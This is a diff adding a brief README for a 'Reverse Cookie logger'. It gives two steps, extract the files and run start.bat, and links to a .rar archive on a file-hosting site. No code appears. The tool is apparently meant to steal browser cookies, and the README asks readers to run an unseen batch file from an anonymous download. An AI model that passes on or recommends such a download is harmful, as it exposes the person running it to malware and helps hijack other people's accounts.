@@ -1,0 +1,8 @@
+Reverse Cookie logger
+
+1. Extract all files
+2. run start.bat
+
+FILE: 
+
+https://www.mediafire.com/file/9d4u7snsk6a6xlw/Reverse_Cookie_logger.rar/file
